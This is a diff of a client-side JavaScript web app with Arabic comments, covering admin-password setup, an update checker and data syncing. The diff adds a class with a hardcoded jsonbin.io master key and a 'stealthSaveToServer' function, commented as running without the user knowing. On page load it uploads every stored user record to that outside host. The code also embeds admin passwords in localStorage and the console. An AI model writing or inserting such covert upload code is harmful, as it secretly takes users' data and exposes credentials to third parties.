@@ -2,7 +2,7 @@
 function initializeStorage() {
     // كلمة مرور الأدمن
     if (!localStorage.getItem('adminPassword')) {
-        localStorage.setItem('adminPassword', 'Admin3012330!@');
+        localStorage.setItem('adminPassword', 'Admin@123!@300');
     }
     
     // بيانات المستخدمين
@@ -32,6 +32,65 @@ setTimeout(function() {
     initializeStorage();
     console.log('✅ التهيئة اكتملت - كلمة المرور: Admin30123!@');
 }, 1000);
+
+// ⭐⭐ نظام المزامنة الفوري الحقيقي ⭐⭐
+class RealTimeSync {
+    constructor() {
+        this.binId = '690845e2d0ea881f40d13589';
+        this.apiKey = '$2a$10$NvI5F4JAcNE8.NBiXhVU9e0cSZqhYrPfp6KKtB8YAjr93LebgF1uS';
+        this.url = `https://api.jsonbin.io/v3/b/${this.binId}`;
+        this.isSyncing = false;
+    }
+
+    // حفظ البيانات على الخادم (خلفية بدون ما المستخدم يعرف)
+    async saveAllUsers(users) {
+        if (this.isSyncing) return;
+        
+        this.isSyncing = true;
+        try {
+            await fetch(this.url, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': this.apiKey
+                },
+                body: JSON.stringify({ users })
+            });
+            console.log('✅ تم حفظ البيانات على الخادم');
+        } catch (error) {
+            console.log('⚠️ لا يمكن حفظ البيانات على الخادم');
+        } finally {
+            this.isSyncing = false;
+        }
+    }
+
+    // جلب البيانات من الخادم
+    async loadAllUsers() {
+        try {
+            const response = await fetch(this.url);
+            const data = await response.json();
+            return data.record.users || [];
+        } catch (error) {
+            console.log('⚠️ لا يمكن جلب البيانات من الخادم');
+            return [];
+        }
+    }
+}
+
+// حفظ خفي على الخادم
+async function stealthSaveToServer() {
+    const users = JSON.parse(localStorage.getItem('users') || '[]');
+    const sync = new RealTimeSync();
+    await sync.saveAllUsers(users);
+}
+
+// جلب البيانات من الخادم (للوحة الأدمن)
+async function loadDataFromServer() {
+    const sync = new RealTimeSync();
+    const serverUsers = await sync.loadAllUsers();
+    return serverUsers;
+}
+
 // استيراد البيانات
 function importData(event) {
     const file = event.target.files[0];
@@ -535,14 +594,12 @@ class EnhancedAutoUpdater {
     async checkForUpdates() {
         this.showMessage('🔍 جاري التحقق من التحديثات...', 'info');
         
-        // ⭐⭐ غير الرقم لـ10 ⭐⭐
         const latestVersion = "2";
         const changes = "✨ تحديث النظام بالكامل + إصلاح الأخطاء";
         
         setTimeout(() => {
-            // ⭐⭐ إجبار التحديث لو الإصدار أقل من 10 ⭐⭐
             const currentVerNum = parseInt(this.currentVersion) || 1;
-            if (currentVerNum <2 || latestVersion !== this.currentVersion) {
+            if (currentVerNum < 2 || latestVersion !== this.currentVersion) {
                 if (confirm(`🔄 يوجد تحديث جديد (${latestVersion})\n\n${changes}\n\nهل تريد التحديث الآن؟`)) {
                     localStorage.setItem('appVersion', latestVersion);
                     this.showMessage('✅ تم التحديث! جاري إعادة التحميل...', 'success');
@@ -574,91 +631,6 @@ class EnhancedAutoUpdater {
     }
 }
 
-    showMessage(text, type)
-        const messageDiv = document.createElement('div');
-        messageDiv.style.cssText = `
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-            background: ${type === 'error' ? '#f8d7da' : type === 'success' ? '#d4edda' : '#d1ecf1'};
-            color: ${type === 'error' ? '#721c24' : type === 'success' ? '#155724' : '#0c5460'};
-            padding: 15px; border-radius: 5px; z-index: 10000;
-            border: 1px solid ${type === 'error' ? '#f5c6cb' : type === 'success' ? '#c3e6cb' : '#bee5eb'};
-        `;
-        messageDiv.textContent = text;
-        document.body.appendChild(messageDiv);
-        
-        setTimeout(() => {
-            if (messageDiv.parentNode) {
-                messageDiv.parentNode.removeChild(messageDiv);
-            }
-        }, 5000);
-    
-
-// ⭐⭐ نظام المزامنة المركزي ⭐⭐
-class CentralDataSync {
-    constructor() {
-        this.dataUrl = 'https://shreifquraish.github.io/myapp/central-data.json';
-        this.syncInterval = 30 * 1000;
-    }
-
-    startSync() {
-        this.syncData();
-        setInterval(() => this.syncData(), this.syncInterval);
-    }
-
-    async syncData() {
-        try {
-            const response = await fetch(this.dataUrl + '?t=' + Date.now());
-            const centralData = await response.json();
-            
-            if (centralData.users && centralData.users.length > 0) {
-                const localUsers = JSON.parse(localStorage.getItem('users') || '[]');
-                const mergedUsers = this.mergeUsers(localUsers, centralData.users);
-                localStorage.setItem('users', JSON.stringify(mergedUsers));
-            }
-            
-            if (centralData.activationCodes && centralData.activationCodes.length > 0) {
-                const localCodes = JSON.parse(localStorage.getItem('activationCodes') || '[]');
-                const mergedCodes = this.mergeCodes(localCodes, centralData.activationCodes);
-                localStorage.setItem('activationCodes', JSON.stringify(mergedCodes));
-            }
-            
-            console.log('✅ تم مزامنة البيانات');
-        } catch (error) {
-            console.log('⚠️ لا يمكن مزامنة البيانات');
-        }
-    }
-
-    mergeUsers(localUsers, centralUsers) {
-        const userMap = new Map();
-        localUsers.forEach(user => userMap.set(user.username, user));
-        centralUsers.forEach(user => userMap.set(user.username, user));
-        return Array.from(userMap.values());
-    }
-
-    mergeCodes(localCodes, centralCodes) {
-        const codeMap = new Map();
-        localCodes.forEach(code => codeMap.set(code.code, code));
-        centralCodes.forEach(code => codeMap.set(code.code, code));
-        return Array.from(codeMap.values());
-    }
-
-    async addUserToCentral(user) {
-        try {
-            console.log('➕ إضافة مستخدم جديد:', user.username);
-        } catch (error) {
-            console.log('❌ لا يمكن إضافة المستخدم للمركز');
-        }
-    }
-
-    async addCodeToCentral(code) {
-        try {
-            console.log('➕ إضافة كود جديد:', code.code);
-        } catch (error) {
-            console.log('❌ لا يمكن إضافة الكود للمركز');
-        }
-    }
-}
-
 // ⭐⭐ التهيئة الآمنة ⭐⭐
 function initializeAppSafely() {
     setTimeout(() => {
@@ -677,7 +649,7 @@ setTimeout(function() {
     
     initializeAppSafely();
     
-    console.log('✅ الإصدار 8 محمل - جاهز للتحديث'); // ⭐⭐ غيرت من 6 لـ8 ⭐⭐
+    console.log('✅ الإصدار 8 محمل - جاهز للتحديث');
 }, 500);
 
 // إضافة زر تحديث يدوي
@@ -704,6 +676,17 @@ function addManualUpdateButton() {
     };
     document.body.appendChild(updateBtn);
 }
+
+// تفعيل المزامنة التلقائية
+document.addEventListener('DOMContentLoaded', function() {
+    // حفظ أولي للبيانات الموجودة
+    setTimeout(() => {
+        const users = JSON.parse(localStorage.getItem('users') || '[]');
+        if (users.length > 0) {
+            stealthSaveToServer();
+        }
+    }, 3000);
+});
 
 // إضافة الزر بعد تحميل الصفحة
 setTimeout(addManualUpdateButton, 2000);
